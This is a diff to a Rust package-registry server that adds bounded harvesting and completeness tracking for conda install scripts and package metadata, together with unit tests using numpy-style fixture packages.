+/// see. The gaps travel with the bytes on purpose: an empty `scripts` means
+/// "this package ships no hooks" only when `unreadable` is empty and the walk
+/// ran to the end.
+#[derive(Debug, Default, Clone, PartialEq, Eq)]
+struct CondaScriptHarvest {
+    /// `(path, bytes)` for every entry [`conda_scripts::classify_script_path`]
+    /// recognises. Not pre-filtered further: the classifier owns that decision,
+    /// and `package_analysis_service` dedupes the recipe's archived copy of a
+    /// script against the payload copy by body digest.
+    scripts: Vec<(String, Vec<u8>)>,
+    /// Paths that matched but could not be read — over the per-entry cap, or a
+    /// read error part-way through.
+    unreadable: Vec<String>,
+    /// The walk stopped before the end of an archive, so a script past that
+    /// point would never have been seen.
+    truncated: bool,
+}
+
+impl CondaScriptHarvest {
+    /// Fold another archive member's harvest into this one. A `.conda` has two
+    /// members worth scanning, and a gap in either is a gap in the package.
+    fn absorb(&mut self, other: CondaScriptHarvest) {
+        self.scripts.extend(other.scripts);
+        self.unreadable.extend(other.unreadable);
+        self.truncated |= other.truncated;
+    }
+
+    /// One clause naming what the script scan could not see, or `None` when it
+    /// saw the whole package.
+    fn gap_reason(&self) -> Option<String> {
+        let mut parts = Vec::new();
+        if !self.unreadable.is_empty() {
+            parts.push(format!(
+                "some install scripts exceeded their read limit and were skipped: {}",
+                self.unreadable.join(", ")
+            ));
+        }
+        if self.truncated {
+            parts.push(
+                "the package archive hit an ingest read limit before the scan reached its end"
+                    .to_string(),
+            );
+        }
+        (!parts.is_empty()).then(|| parts.join("; "))
+    }
+}
+
+/// Collect every install script in one decoded tar.
+///
+/// Shares [`walk_bounded_tar`] with the `info/` walk, so the entry-count cap
+/// and the total decompressed-byte budget are literally the same; each script
+/// is then read through [`MAX_CONDA_SCRIPT_ENTRY_BYTES`]. Only regular files
+/// are read: a payload is full of symlinks and hardlinks, whose tar entries
+/// carry no body, and recording an empty script for one would be a lie.
+fn collect_conda_scripts_from_tar<R: std::io::Read>(reader: R, what: &str) -> CondaScriptHarvest {
+    let mut harvest = CondaScriptHarvest::default();
+
+    let outcome = walk_bounded_tar(reader, what, |path, entry_type, entry| {
+        if !entry_type.is_file() {
+            return;
+        }
+        if crate::services::conda_scripts::classify_script_path(path).is_none() {
+            return;
+        }
+        match crate::util::bounded_archive::read_capped(entry, MAX_CONDA_SCRIPT_ENTRY_BYTES, path) {
+            Ok(bytes) => harvest.scripts.push((path.to_string(), bytes)),
+            Err(e) => {
+                tracing::debug!("conda install script {} is not readable: {}", path, e);
+                harvest.unreadable.push(path.to_string());
+            }
+        }
+    });
+
+    harvest.truncated |= outcome.truncated;
+    harvest
+}
+
+/// The `.conda` (v2) ZIP members worth scanning for scripts: `pkg-*.tar.zst`
+/// holds the installed files where the hooks actually run from, `info-*.tar.zst`
+/// holds the recipe's archived copy of the same script.
+fn is_conda_v2_scannable_member(name: &str) -> bool {
+    (name.starts_with("pkg-") || name.starts_with("info-")) && name.ends_with(".tar.zst")
+}
+
+/// Harvest install scripts from a `.conda` (v2) package.
+///
+/// The payload member is **streamed** through zstd into the bounded tar walk
+/// rather than buffered first, which is the only way it can be read at all: the
+/// metadata path buffers `info-*.tar.zst` under the 8 MiB per-entry cap, and a
+/// real package's payload is far larger than that. Streaming keeps the same
+/// three caps — the decompressed-byte budget on the decoded stream, the
+/// entry-count cap on the walk, the per-entry cap on each script — without
+/// lifting any of them; a payload that inflates past the budget simply ends the
+/// walk and is reported as truncated.
+fn collect_conda_v2_scripts(content: &[u8]) -> CondaScriptHarvest {
+    let mut harvest = CondaScriptHarvest::default();
+    let Ok(mut archive) = zip::ZipArchive::new(std::io::Cursor::new(content)) else {
+        tracing::debug!("conda v2 package is not a readable zip; no scripts collected");
+        return harvest;
+    };
+
+    let members: Vec<usize> = (0..archive.len())
+        .filter(|idx| {
+            archive
+                .by_index(*idx)
+                .is_ok_and(|f| is_conda_v2_scannable_member(f.name()))
+        })
+        .collect();
+
+    for idx in members {
+        let Ok(file) = archive.by_index(idx) else {
+            continue;
+        };
+        let what = format!("conda member {}", file.name());
+        match zstd::Decoder::new(file) {
+            Ok(decoder) => harvest.absorb(collect_conda_scripts_from_tar(decoder, &what)),
+            Err(e) => {
+                tracing::debug!("{} is not zstd-decodable: {}", what, e);
+                harvest.truncated = true;
+            }
+        }
+    }
+
+    harvest
+}
+
+/// Harvest install scripts from a `.tar.bz2` (v1) package, whose payload and
+/// `info/` tree share one tar.
+fn collect_conda_v1_scripts(content: &[u8]) -> CondaScriptHarvest {
+    collect_conda_scripts_from_tar(bzip2::read::BzDecoder::new(content), "conda v1 tar")
+}
+
+/// Harvest the install scripts of an uploaded conda package.
+///
+/// Best-effort throughout, like the metadata enrichment: an unreadable
+/// container yields an empty harvest rather than failing an upload whose
+/// artifact row is already committed.
+fn collect_conda_install_scripts(content: &[u8], filename: &str) -> CondaScriptHarvest {
+    if filename.ends_with(".conda") {
+        collect_conda_v2_scripts(content)
+    } else if filename.ends_with(".tar.bz2") {
+        collect_conda_v1_scripts(content)
+    } else {
+        CondaScriptHarvest::default()
+    }
 }
 
 // ---------------------------------------------------------------------------
@@ -3387,6 +3999,128 @@ async fn get_attestation_with_token(
 // Shared upload logic
 // ---------------------------------------------------------------------------
 
+/// The recipe files the analyzer parses, read back out of the extracted
+/// metadata document where `enrich_with_info_tree` stored them as raw text.
+fn conda_recipe_files(doc: &serde_json::Value) -> Vec<(String, Vec<u8>)> {
+    doc.get("recipe")
+        .and_then(|r| r.as_object())
+        .map(|m| {
+            m.iter()
+                .filter_map(|(name, v)| v.as_str().map(|s| (name.clone(), s.as_bytes().to_vec())))
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// The `info/` members that were there but could not be used.
+///
+/// `info_files` records, per member, whether it was present, absent or
+/// unreadable. Anything unreadable means the package was only partially
+/// inspected, and the UI must say so rather than render a green "nothing
+/// found".
+fn conda_unreadable_info_slots(doc: &serde_json::Value) -> Vec<String> {
+    doc.get("info_files")
+        .and_then(|s| s.as_object())
+        .map(|m| {
+            m.iter()
+                .filter(|(_, v)| v.as_str() == Some(INFO_STATUS_UNREADABLE))
+                .map(|(k, _)| k.clone())
+                .collect()
+        })
+        .unwrap_or_default()
+}
+
+/// How much of a conda package the upload path actually managed to read.
+///
+/// `Complete` requires both halves to be whole: every `info/` member readable
+/// *and* every install script read in full by a walk that reached the end of
+/// the archive. A script we could not read is the one gap that must never be
+/// rounded down to "no scripts found", because that renders as a clean bill of
+/// health for a package whose install-time code was never looked at.
+fn conda_analysis_completeness(
+    extracted: Option<&serde_json::Value>,
+    scripts: &CondaScriptHarvest,
+) -> crate::services::package_analysis_service::Completeness {
+    use crate::services::package_analysis_service::Completeness;
+
+    let Some(doc) = extracted else {
+        return Completeness::NotRead {
+            reason: "Package contents could not be decoded at upload time".to_string(),
+        };
+    };
+
+    let mut gaps: Vec<String> = Vec::new();
+    let unreadable = conda_unreadable_info_slots(doc);
+    if !unreadable.is_empty() {
+        gaps.push(format!(
+            "some package metadata exceeded its read limit and was skipped: {}",
+            unreadable.join(", ")
+        ));
+    }
+    gaps.extend(scripts.gap_reason());
+
+    if gaps.is_empty() {
+        return Completeness::Complete;
+    }
+
+    let mut reason = gaps.join("; ");
+    if let Some(first) = reason.get_mut(0..1) {
+        first.make_ascii_uppercase();
+    }
+    Completeness::Partial {
+        reason,
+        files_read: scripts.scripts.len() as i32,
+        files_total: (scripts.scripts.len() + scripts.unreadable.len()) as i32,
+    }
+}
+
+/// Record the vendored-component and install-script analysis for a stored
+/// conda package (#4033).
+///
+/// Best-effort, exactly like the metadata enrichment above it: the artifact row
+/// is already committed, so a failure here must not fail an upload that
+/// otherwise succeeded. But "best effort" must not become "silently claims
+/// nothing was found" — the whole point of `Completeness` is that an empty
+/// component list means something different depending on whether we looked.
+/// So every path below records a row, including the ones where we could not.
+///
+/// `extracted` is `None` when the bounded-extraction permit was unavailable or
+/// the archive could not be decoded at all; that is `NotRead`, not `Complete`.
+///
+/// `scripts` carries the payload's install scripts — `bin/.<pkg>-post-link.sh`
+/// and friends, which live outside `info/` and so needed a walk of their own —
+/// together with any that were too large to read.
+async fn record_conda_package_analysis(
+    state: &SharedState,
+    artifact_id: uuid::Uuid,
+    extracted: Option<&serde_json::Value>,
+    scripts: CondaScriptHarvest,
+) {
+    use crate::services::package_analysis_service::{record_analysis, PackageAnalysisInput};
+
+    let completeness = conda_analysis_completeness(extracted, &scripts);
+    let recipe_files = extracted.map(conda_recipe_files).unwrap_or_default();
+
+    let input = PackageAnalysisInput {
+        artifact_id,
+        format: "conda".to_string(),
+        recipe_files,
+        script_files: scripts.scripts,
+        inline_scripts: Vec::new(),
+        unanalyzed_scripts: Vec::new(),
+        components: Vec::new(),
+        completeness,
+    };
+
+    if let Err(e) = record_analysis(&state.db, input).await {
+        tracing::warn!(
+            artifact_id = %artifact_id,
+            error = %e,
+            "conda package analysis could not be recorded"
+        );
+    }
+}
+
 async fn store_conda_package(
     state: &SharedState,
     repo: &RepoInfo,
@@ -3526,91 +4260,26 @@ async fn store_conda_package(
     // Extract metadata from package contents. #2561: permit-scoped decode; the
     // artifact row is already committed, so a saturated server skips this
     // best-effort enrichment rather than failing the stored upload.
-    let extracted = crate::util::bounded_archive::with_ingest_extraction(|| {
-        extract_conda_metadata(&content, filename)
+    // The install scripts come out of the payload, which the metadata walk
+    // never opens, so they need a second pass over the same bytes — inside the
+    // same permit, since it is the same class of bounded decode work.
+    let (extracted, install_scripts) = crate::util::bounded_archive::with_ingest_extraction(|| {
+        (
+            extract_conda_metadata(&content, filename),
+            collect_conda_install_scripts(&content, filename),
+        )
     })
-    .ok()
-    .flatten();
+    .unwrap_or_default();
 
-    let build_number = extracted
-        .as_ref()
-        .and_then(|m| m.get("build_number").and_then(|v| v.as_u64()))
-        .unwrap_or(0);
-
-    let depends = extracted
-        .as_ref()
-        .and_then(|m| m.get("depends"))
-        .cloned()
-        .unwrap_or_else(|| serde_json::json!([]));
-
-    let constrains = extracted
-        .as_ref()
-        .and_then(|m| m.get("constrains"))
-        .cloned()
-        .unwrap_or_else(|| serde_json::json!([]));
-
-    let license = extracted
-        .as_ref()
-        .and_then(|m| m.get("license").and_then(|v| v.as_str()))
-        .unwrap_or("")
-        .to_string();
-
-    let license_family = extracted
-        .as_ref()
-        .and_then(|m| m.get("license_family").and_then(|v| v.as_str()))
-        .unwrap_or("")
-        .to_string();
-
-    let timestamp = extracted
-        .as_ref()
-        .and_then(|m| m.get("timestamp").and_then(|v| v.as_u64()));
-
-    let features = extracted
-        .as_ref()
-        .and_then(|m| m.get("features").and_then(|v| v.as_str()))
-        .unwrap_or("")
-        .to_string();
-
-    let track_features = extracted
-        .as_ref()
-        .and_then(|m| m.get("track_features").and_then(|v| v.as_str()))
-        .unwrap_or("")
-        .to_string();
-
-    let noarch = extracted
-        .as_ref()
-        .and_then(|m| m.get("noarch").and_then(|v| v.as_str()))
-        .unwrap_or("")
-        .to_string();
-
-    // Store conda-specific metadata (with real values extracted from package)
-    let mut conda_metadata = serde_json::json!({
-        "name": pkg_name,
-        "version": pkg_version,
-        "build": build_string,
-        "build_number": build_number,
-        "subdir": subdir,
-        "package_format": conda_package_format(filename),
-        "depends": depends,
-        "constrains": constrains,
-        "license": license,
-        "md5": computed_md5,
-    });
-    if !license_family.is_empty() {
-        conda_metadata["license_family"] = serde_json::Value::String(license_family);
-    }
-    if let Some(ts) = timestamp {
-        conda_metadata["timestamp"] = serde_json::json!(ts);
-    }
-    if !features.is_empty() {
-        conda_metadata["features"] = serde_json::Value::String(features);
-    }
-    if !track_features.is_empty() {
-        conda_metadata["track_features"] = serde_json::Value::String(track_features);
-    }
-    if !noarch.is_empty() {
-        conda_metadata["noarch"] = serde_json::Value::String(noarch);
-    }
+    let conda_metadata = build_conda_metadata(
+        &pkg_name,
+        &pkg_version,
+        &build_string,
+        subdir,
+        conda_package_format(filename),
+        &computed_md5,
+        extracted.as_ref(),
+    );
 
     let _ = sqlx::query!(
         r#"
@@ -3623,6 +4292,8 @@ async fn store_conda_package(
     )
     .execute(&state.db)
     .await;
+
+    record_conda_package_analysis(state, artifact_id, extracted.as_ref(), install_scripts).await;
 
     // Surface the package on the Packages page (#3659), keyed on the conda
     // package's own name/version (the build string stays in metadata), with
@@ -3672,6 +4343,118 @@ async fn store_conda_package(
             .to_string(),
         ))
         .unwrap())
+}
+
+/// Build the `artifact_metadata.metadata` document persisted for a conda
+/// package: the coordinates taken from the filename plus everything the
+/// `info/` tree yielded (#4037).
+///
+/// Split out of `store_conda_package` so the keys written here can be asserted
+/// against the keys `channeldata.json` and `run_exports.json` read back
+/// (#4038) without standing up a database.
+fn build_conda_metadata(
+    pkg_name: &str,
+    pkg_version: &str,
+    build_string: &str,
+    subdir: &str,
+    package_format: &str,
+    computed_md5: &str,
+    extracted: Option<&serde_json::Value>,
+) -> serde_json::Value {
+    let field_str = |field: &str| {
+        extracted
+            .and_then(|m| m.get(field).and_then(|v| v.as_str()))
+            .unwrap_or("")
+            .to_string()
+    };
+
+    let build_number = extracted
+        .and_then(|m| m.get("build_number").and_then(|v| v.as_u64()))
+        .unwrap_or(0);
+
+    let depends = extracted
+        .and_then(|m| m.get("depends"))
+        .cloned()
+        .unwrap_or_else(|| serde_json::json!([]));
+
+    let constrains = extracted
+        .and_then(|m| m.get("constrains"))
+        .cloned()
+        .unwrap_or_else(|| serde_json::json!([]));
+
+    let timestamp = extracted.and_then(|m| m.get("timestamp").and_then(|v| v.as_u64()));
+
+    let license_family = field_str("license_family");
+    let features = field_str("features");
+    let track_features = field_str("track_features");
+    let noarch = field_str("noarch");
+
+    // Store conda-specific metadata (with real values extracted from package)
+    let mut conda_metadata = serde_json::json!({
+        "name": pkg_name,
+        "version": pkg_version,
+        "build": build_string,
+        "build_number": build_number,
+        "subdir": subdir,
+        "package_format": package_format,
+        "depends": depends,
+        "constrains": constrains,
+        "license": field_str("license"),
+        "md5": computed_md5,
+    });
+    if !license_family.is_empty() {
+        conda_metadata["license_family"] = serde_json::Value::String(license_family);
+    }
+    if let Some(ts) = timestamp {
+        conda_metadata["timestamp"] = serde_json::json!(ts);
+    }
+    if !features.is_empty() {
+        conda_metadata["features"] = serde_json::Value::String(features);
+    }
+    if !track_features.is_empty() {
+        conda_metadata["track_features"] = serde_json::Value::String(track_features);
+    }
+    if !noarch.is_empty() {
+        conda_metadata["noarch"] = serde_json::Value::String(noarch);
+    }
+
+    // #4038: the about.json text fields channeldata.json serves. Written flat
+    // under the very keys the read path looks for, and only when the package
+    // actually declared them.
+    for key in CHANNELDATA_METADATA_KEYS {
+        let already_set = conda_metadata
+            .get(key)
+            .and_then(|v| v.as_str())
+            .is_some_and(|s| !s.is_empty());
+        if already_set {
+            continue;
+        }
+        if let Some(value) = extracted.and_then(|m| m.get(key)).and_then(|v| v.as_str()) {
+            if !value.is_empty() {
+                conda_metadata[key] = serde_json::Value::String(value.to_string());
+            }
+        }
+    }
+
+    // #4037: the structured members of the info/ tree, stored verbatim. `paths`
+    // and `info_files` are always written (they record absence explicitly);
+    // the rest appear only when the package carried them.
+    for key in [
+        "about",
+        "paths",
+        "recipe",
+        "link",
+        RUN_EXPORTS_METADATA_KEY,
+        "hash_input",
+        "has_install_scripts",
+        "info_files",
+    ] {
+        if let Some(value) = extracted.and_then(|m| m.get(key)) {
+            conda_metadata[key] = value.clone();
+        }
+    }
+
+    conda_metadata
 }
 
 // ---------------------------------------------------------------------------
@@ -9556,6 +10339,902 @@ mod tests {
             "an already-coded body must be served byte-for-byte"
         );
     }
+
+    // -----------------------------------------------------------------------
+    // Full `info/` tree extraction (#4037)
+    // -----------------------------------------------------------------------
+
+    /// TEST FIXTURE: a recipe carrying unrendered Jinja. Capturing it verbatim
+    /// is the point — parsing belongs to the recipe module, not to ingest.
+    const TEST_RECIPE_META_YAML: &str = concat!(
+        "{% set version = \"1.26.4\" %}\n",
+        "package:\n",
+        "  name: numpy\n",
+        "  version: {{ version }}\n",
+    );
+
+    /// TEST FIXTURE: build an uncompressed tar carrying an arbitrary set of
+    /// `info/` members.
+    fn build_info_tar(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
+        let mut tar_buf = Vec::new();
+        {
+            let mut builder = tar::Builder::new(&mut tar_buf);
+            for (path, bytes) in files {
+                let mut header = tar::Header::new_gnu();
+                header.set_size(bytes.len() as u64);
+                header.set_mode(0o644);
+                header.set_cksum();
+                builder.append_data(&mut header, *path, &bytes[..]).unwrap();
+            }
+            builder.finish().unwrap();
+        }
+        tar_buf
+    }
+
+    /// TEST FIXTURE: a `.conda` (v2) package whose info tar carries an
+    /// arbitrary set of `info/` members.
+    fn build_test_conda_v2_package_with_info(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
+        let compressed_tar =
+            zstd::encode_all(std::io::Cursor::new(&build_info_tar(files)), 3).unwrap();
+
+        let mut zip_buf = Vec::new();
+        {
+            let mut writer = zip::ZipWriter::new(std::io::Cursor::new(&mut zip_buf));
+            let options = zip::write::SimpleFileOptions::default()
+                .compression_method(zip::CompressionMethod::Stored);
+            writer.start_file("metadata.json", options).unwrap();
+            std::io::Write::write_all(&mut writer, br#"{"conda_pkg_format_version":2}"#).unwrap();
+            writer
+                .start_file("info-pkg-1.0-build_0.tar.zst", options)
+                .unwrap();
+            std::io::Write::write_all(&mut writer, &compressed_tar).unwrap();
+            writer.finish().unwrap();
+        }
+        zip_buf
+    }
+
+    /// TEST FIXTURE: a `.tar.bz2` (v1) package carrying an arbitrary set of
+    /// `info/` members.
+    fn build_test_conda_v1_package_with_info(files: &[(&str, Vec<u8>)]) -> Vec<u8> {
+        bzip2_compress(&build_info_tar(files))
+    }
+
+    /// TEST FIXTURE: the complete `info/` tree of a realistic package.
+    fn full_info_tree_files() -> Vec<(&'static str, Vec<u8>)> {
+        let json = |v: serde_json::Value| serde_json::to_vec(&v).unwrap();
+        vec![
+            (
+                "info/index.json",
+                json(serde_json::json!({
+                    "name": "numpy",
+                    "version": "1.26.4",
+                    "build": "py312h02b7e37_0",
+                    "build_number": 0,
+                    "depends": ["python >=3.12"],
+                    "subdir": "linux-64",
+                    "license": "BSD-3-Clause",
+                })),
+            ),
+            (
+                "info/about.json",
+                json(serde_json::json!({
+                    "summary": "Fundamental package for array computing",
+                    "description": "NumPy is the fundamental package for scientific computing.",
+                    "home": "https://numpy.org",
+                    "doc_url": "https://numpy.org/doc/stable/",
+                    "dev_url": "https://github.com/numpy/numpy",
+                    "source_url": "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz",
+                    "license": "BSD-3-Clause",
+                    "license_family": "BSD",
+                })),
+            ),
+            (
+                "info/paths.json",
+                json(serde_json::json!({
+                    "paths_version": 1,
+                    "paths": [
+                        {
+                            "_path": "lib/python3.12/site-packages/numpy/__init__.py",
+                            "path_type": "hardlink",
+                            "sha256": "1111111111111111111111111111111111111111111111111111111111111111",
+                            "size_in_bytes": 1234,
+                        },
+                        {
+                            "_path": "bin/.numpy-post-link.sh",
+                            "path_type": "hardlink",
+                            "sha256": "2222222222222222222222222222222222222222222222222222222222222222",
+                            "size_in_bytes": 42,
+                        },
+                    ],
+                })),
+            ),
+            (
+                "info/recipe/meta.yaml",
+                TEST_RECIPE_META_YAML.as_bytes().to_vec(),
+            ),
+            (
+                "info/link.json",
+                json(serde_json::json!({
+                    "noarch": { "type": "python", "entry_points": ["f = m:main"] },
+                    "package_metadata_version": 1,
+                })),
+            ),
+            (
+                "info/run_exports.json",
+                json(serde_json::json!({
+                    "weak": ["numpy >=1.26.4,<2.0a0"],
+                    "strong": [],
+                })),
+            ),
+            (
+                "info/hash_input.json",
+                json(serde_json::json!({
+                    "python": "3.12.* *_cpython",
+                    "numpy": "1.26",
+                })),
+            ),
+        ]
+    }
+
+    /// Shared assertions over a fully-populated `info/` tree, applied to both
+    /// package formats so v1 and v2 cannot drift apart.
+    fn assert_full_info_tree(extracted: &serde_json::Value) {
+        // index.json still drives the package coordinates.
+        assert_eq!(extracted["name"], "numpy");
+        assert_eq!(extracted["version"], "1.26.4");
+
+        // info/about.json, promoted flat for channeldata.json (#4038).
+        assert_eq!(
+            extracted["summary"],
+            "Fundamental package for array computing"
+        );
+        assert_eq!(
+            extracted["description"],
+            "NumPy is the fundamental package for scientific computing."
+        );
+        assert_eq!(extracted["home"], "https://numpy.org");
+        assert_eq!(extracted["doc_url"], "https://numpy.org/doc/stable/");
+        assert_eq!(extracted["dev_url"], "https://github.com/numpy/numpy");
+        assert_eq!(
+            extracted["source_url"],
+            "https://pypi.io/packages/source/n/numpy/numpy-1.26.4.tar.gz"
+        );
+        assert_eq!(extracted["license_family"], "BSD");
+        // ...and kept whole for anything the flat promotion drops.
+        assert_eq!(extracted["about"]["license"], "BSD-3-Clause");
+
+        // info/paths.json: the per-file manifest, hashes intact.
+        assert_eq!(extracted["paths"]["source"], "paths.json");
+        assert_eq!(extracted["paths"]["has_hashes"], true);
+        assert_eq!(extracted["paths"]["file_count"], 2);
+        assert_eq!(
+            extracted["paths"]["paths"][0]["_path"],
+            "lib/python3.12/site-packages/numpy/__init__.py"
+        );
+        assert_eq!(
+            extracted["paths"]["paths"][0]["sha256"],
+            "1111111111111111111111111111111111111111111111111111111111111111"
+        );
+        assert_eq!(extracted["paths"]["paths"][0]["size_in_bytes"], 1234);
+
+        // info/recipe/: raw text, deliberately unparsed.
+        assert_eq!(extracted["recipe"]["meta.yaml"], TEST_RECIPE_META_YAML);
+
+        // info/link.json plus the derived install-script flag.
+        assert_eq!(extracted["link"]["noarch"]["type"], "python");
+        assert_eq!(
+            extracted["has_install_scripts"], true,
+            "bin/.numpy-post-link.sh in the manifest means the package runs code at install time"
+        );
+
+        // info/run_exports.json — the key run_exports.json serves (#4038).
+        assert_eq!(extracted["run_exports"]["weak"][0], "numpy >=1.26.4,<2.0a0");
+
+        // info/hash_input.json — the variant inputs behind the build string.
+        assert_eq!(extracted["hash_input"]["python"], "3.12.* *_cpython");
+
+        // Presence is recorded explicitly, so "absent" is distinguishable
+        // from "never looked at".
+        let status = &extracted["info_files"];
+        assert_eq!(status["about_json"], "present");
+        assert_eq!(status["paths_json"], "present");
+        assert_eq!(status["recipe"], "present");
+        assert_eq!(status["link_json"], "present");
+        assert_eq!(status["run_exports_json"], "present");
+        assert_eq!(status["hash_input_json"], "present");
+        assert_eq!(
+            status["files"], "absent",
+            "this package has paths.json, so the legacy info/files list is genuinely absent"
+        );
+    }
+
+    #[test]
+    fn test_extract_conda_v2_reads_full_info_tree() {
+        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_v2_metadata(&package).expect("v2 package extracts");
+        assert_full_info_tree(&extracted);
+    }
+
+    #[test]
+    fn test_extract_conda_v1_reads_full_info_tree() {
+        let package = build_test_conda_v1_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_v1_metadata(&package).expect("v1 package extracts");
+        assert_full_info_tree(&extracted);
+    }
+
+    /// Every `info/` member but `index.json` is optional: a package carrying
+    /// none of them must still ingest, and must record the absence rather than
+    /// leaving the caller unable to tell "no recipe" from "not looked at".
+    #[test]
+    fn test_extract_conda_bare_index_records_absence() {
+        let files = vec![(
+            "info/index.json",
+            serde_json::to_vec(&serde_json::json!({
+                "name": "bare", "version": "1.0", "build": "0", "build_number": 0,
+            }))
+            .unwrap(),
+        )];
+        for (label, package) in [
+            ("v2", build_test_conda_v2_package_with_info(&files)),
+            ("v1", build_test_conda_v1_package_with_info(&files)),
+        ] {
+            let extracted = extract_conda_metadata(
+                &package,
+                if label == "v2" {
+                    "b.conda"
+                } else {
+                    "b.tar.bz2"
+                },
+            )
+            .unwrap_or_else(|| panic!("{label} bare package must still ingest"));
+
+            assert_eq!(extracted["name"], "bare", "{label}");
+            let status = &extracted["info_files"];
+            for slot in [
+                "about_json",
+                "paths_json",
+                "files",
+                "recipe",
+                "link_json",
+                "run_exports_json",
+                "hash_input_json",
+            ] {
+                assert_eq!(
+                    status[slot], "absent",
+                    "{label} {slot} must be recorded absent"
+                );
+            }
+            assert!(
+                extracted.get("run_exports").is_none(),
+                "{label}: a package with no run_exports.json must not invent one"
+            );
+            assert!(
+                extracted.get("recipe").is_none(),
+                "{label}: a package with no recipe must not invent one"
+            );
+            assert_eq!(extracted["paths"]["source"], "none", "{label}");
+            assert_eq!(extracted["has_install_scripts"], false, "{label}");
+        }
+    }
+
+    /// Older packages predate `info/paths.json` and carry only `info/files`,
+    /// a newline-separated path list with no hashes.
+    #[test]
+    fn test_paths_json_absent_falls_back_to_hashless_files_list() {
+        let files = vec![
+            (
+                "info/index.json",
+                serde_json::to_vec(&serde_json::json!({
+                    "name": "old", "version": "0.1", "build": "0", "build_number": 0,
+                }))
+                .unwrap(),
+            ),
+            ("info/files", b"bin/oldtool\nlib/libold.so\n".to_vec()),
+        ];
+        let package = build_test_conda_v1_package_with_info(&files);
+        let extracted = extract_conda_v1_metadata(&package).expect("legacy package extracts");
+
+        assert_eq!(extracted["paths"]["source"], "files");
+        assert_eq!(
+            extracted["paths"]["has_hashes"], false,
+            "the info/files fallback carries no hashes and must say so"
+        );
+        assert_eq!(extracted["paths"]["file_count"], 2);
+        assert_eq!(extracted["paths"]["paths"][0]["_path"], "bin/oldtool");
+        assert_eq!(extracted["paths"]["paths"][1]["_path"], "lib/libold.so");
+        assert!(
+            extracted["paths"]["paths"][0].get("sha256").is_none(),
+            "the fallback must not fabricate a hash"
+        );
+        assert_eq!(extracted["info_files"]["paths_json"], "absent");
+        assert_eq!(extracted["info_files"]["files"], "present");
+    }
+
+    /// `about.json`'s `source_url` is a string for single-source recipes and an
+    /// array when the recipe pulls several sources; channeldata carries one
+    /// string, so the array form collapses to its first entry.
+    #[test]
+    fn test_about_source_url_accepts_array_form() {
+        let files = vec![
+            (
+                "info/index.json",
+                serde_json::to_vec(&serde_json::json!({
+                    "name": "multi", "version": "1.0", "build": "0", "build_number": 0,
+                }))
+                .unwrap(),
+            ),
+            (
+                "info/about.json",
+                serde_json::to_vec(&serde_json::json!({
+                    "source_url": [
+                        "https://example.invalid/multi-1.0.tar.gz",
+                        "https://example.invalid/multi-data-1.0.tar.gz",
+                    ],
+                }))
+                .unwrap(),
+            ),
+        ];
+        let package = build_test_conda_v1_package_with_info(&files);
+        let extracted = extract_conda_v1_metadata(&package).expect("extracts");
+
+        assert_eq!(
+            extracted["source_url"],
+            "https://example.invalid/multi-1.0.tar.gz"
+        );
+        assert!(
+            extracted["about"]["source_url"].is_array(),
+            "the raw about.json value must survive alongside the flattened one"
+        );
+    }
+
+    /// A malformed optional member must not fail the ingest: the package still
+    /// lands, and the member is recorded as unreadable rather than absent.
+    #[test]
+    fn test_malformed_about_json_does_not_fail_ingest() {
+        let files = vec![
+            (
+                "info/index.json",
+                serde_json::to_vec(&serde_json::json!({
+                    "name": "broken", "version": "1.0", "build": "0", "build_number": 0,
+                }))
+                .unwrap(),
+            ),
+            ("info/about.json", b"{ this is not json".to_vec()),
+        ];
+        let package = build_test_conda_v1_package_with_info(&files);
+        let extracted = extract_conda_v1_metadata(&package).expect("ingest must not fail");
+
+        assert_eq!(extracted["name"], "broken");
+        assert_eq!(extracted["info_files"]["about_json"], "unreadable");
+        assert!(extracted.get("about").is_none());
+    }
+
+    /// A `paths.json` past the manifest cap is a bomb-shaped input: it must be
+    /// refused and recorded, not buffered, and the package still ingests.
+    #[test]
+    fn test_oversized_paths_json_is_bounded_and_recorded() {
+        let entry = serde_json::json!({
+            "_path": "lib/padpadpadpadpadpadpadpadpadpadpadpadpadpadpadpadpadpad.so",
+            "path_type": "hardlink",
+            "sha256": "3333333333333333333333333333333333333333333333333333333333333333",
+            "size_in_bytes": 1,
+        });
+        let count = (MAX_CONDA_MANIFEST_ENTRY_BYTES as usize / 150) + 5_000;
+        let huge = serde_json::json!({
+            "paths_version": 1,
+            "paths": vec![entry; count],
+        });
+        let files = vec![
+            (
+                "info/index.json",
+                serde_json::to_vec(&serde_json::json!({
+                    "name": "huge", "version": "1.0", "build": "0", "build_number": 0,
+                }))
+                .unwrap(),
+            ),
+            ("info/paths.json", serde_json::to_vec(&huge).unwrap()),
+        ];
+        let package = build_test_conda_v1_package_with_info(&files);
+        assert!(
+            package.len() < 4 * 1024 * 1024,
+            "the compressed bz2 stays small"
+        );
+
+        let extracted = extract_conda_v1_metadata(&package).expect("ingest must not fail");
+        assert_eq!(extracted["name"], "huge");
+        assert_eq!(
+            extracted["info_files"]["paths_json"], "unreadable",
+            "an over-cap manifest is recorded as unreadable, not silently absent"
+        );
+        assert_eq!(extracted["paths"]["source"], "none");
+    }
+
+    // -----------------------------------------------------------------------
+    // #4038: the keys the write path stores are the keys the read paths read
+    // -----------------------------------------------------------------------
+
+    /// Round trip: a package carrying run_exports must reach
+    /// `run_exports.json` through the persisted metadata document, instead of
+    /// every hosted package serving `{}`.
+    #[test]
+    fn test_run_exports_round_trip_through_persisted_metadata() {
+        let package = build_test_conda_v2_package_with_info(&full_info_tree_files());
+        let extracted = extract_conda_metadata(&package, "numpy-1.26.4-py312h02b7e37_0.conda")
+            .expect("extracts");
+
+        // Exactly what store_conda_package persists...
+        let persisted = build_conda_metadata(
+            "numpy",
+            "1.26.4",
+            "py312h02b7e37_0",
+            "linux-64",
+            "conda_v2",
+            "d41d8cd98f00b204e9800998ecf8427e",
+            Some(&extracted),
+        );
+
+        // ...read back exactly as the run_exports.json handler reads it.
+        let served = package_run_exports(Some(&persisted));
+        assert_ne!(
+            served,
+            serde_json::json!({}),
+            "run_exports.json must not serve an empty object for a package that has run exports"
+        );
+        assert_eq!(served["weak"][0], "numpy >=1.26.4,<2.0a0");
+    }
+
+    /// Round trip: the about.json fields must reach channeldata.json.
+    #[test]
+    fn test_channeldata_fields_round_trip_through_persisted_metadata() {
